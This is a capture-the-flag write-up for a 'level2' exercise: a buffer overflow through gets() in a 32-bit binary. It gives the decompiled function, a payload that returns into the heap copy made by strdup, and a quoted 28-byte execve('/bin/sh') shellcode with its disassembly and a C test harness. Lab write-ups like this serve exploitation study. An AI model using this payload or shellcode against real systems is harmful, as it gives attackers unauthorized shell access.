# Solution

```c
int p()
{
  char v1[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  const void *v2; // [esp+5Ch] [ebp-Ch]
  unsigned int retaddr; // [esp+6Ch] [ebp+4h]

  fflush(stdout);
  gets(v1);
  v2 = (const void *)retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 )
  {
    printf("(%p)\n", v2);
    _exit(1);
  }
  puts(v1);
  return strdup(v1);
}
```

  exploit : make the return adresse point to a shellcode
  but "if ( (retaddr & 0xB0000000) == -1342177280 )" block us from returning to the shellcode
  in the stack so we will use the heap instead

  since aslr is disabled strdup will have the same return adress
  (check $eax in gdb or ltrace)

payload :
  ```sh
  (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08'";cat -) | ./level2
  ```
  shellcode > padding > return adress



shellcode:
  /*
Title:  Linux x86 execve("/bin/sh") - 28 bytes
Author: Jean Pascal Pereira &lt;pereira@secbiz.de&gt;
Web:    http://0xffe4.org


Disassembly of section .text:

08048060 &lt;_start&gt;:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include &lt;stdio.h&gt;

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
